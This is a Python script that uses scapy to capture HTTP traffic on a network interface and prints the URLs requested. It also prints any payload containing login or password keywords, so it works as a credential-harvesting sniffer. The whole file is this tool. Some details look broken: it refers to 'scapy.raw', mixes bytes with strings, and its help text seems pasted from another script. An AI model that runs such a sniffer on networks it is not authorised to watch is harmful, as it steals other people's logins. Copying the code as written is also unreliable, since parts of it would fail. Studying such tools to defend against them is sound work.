import scapy.all as scapy
#pip install scapy_http (run thsi command to install 3rd party module named scapy_http)
from scapy.layers import http
import argparse

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.raw):
		load=packet[scapy.raw].load
		keywords=["username","user","login","password","pass"]
		for keyword in keywords:
			if keyword in load:
				return load

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url= get_url(packet)
		print("HTTP Request --> "+url.decode())

		login_info = get_login_info(packet)
		if login_info:
			print("\n\n Possible Username/Passwords --> "+login_info+ "\n\n")
				

def get_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--interface", dest="interface", help="Input the interface who's value need to be changed")
	options = parser.parse_args()
	if not options.interface:
		parser.error("please enter an interface value (Use --help to know more)")
	return options

options=get_arguments()

sniff(options.interface)
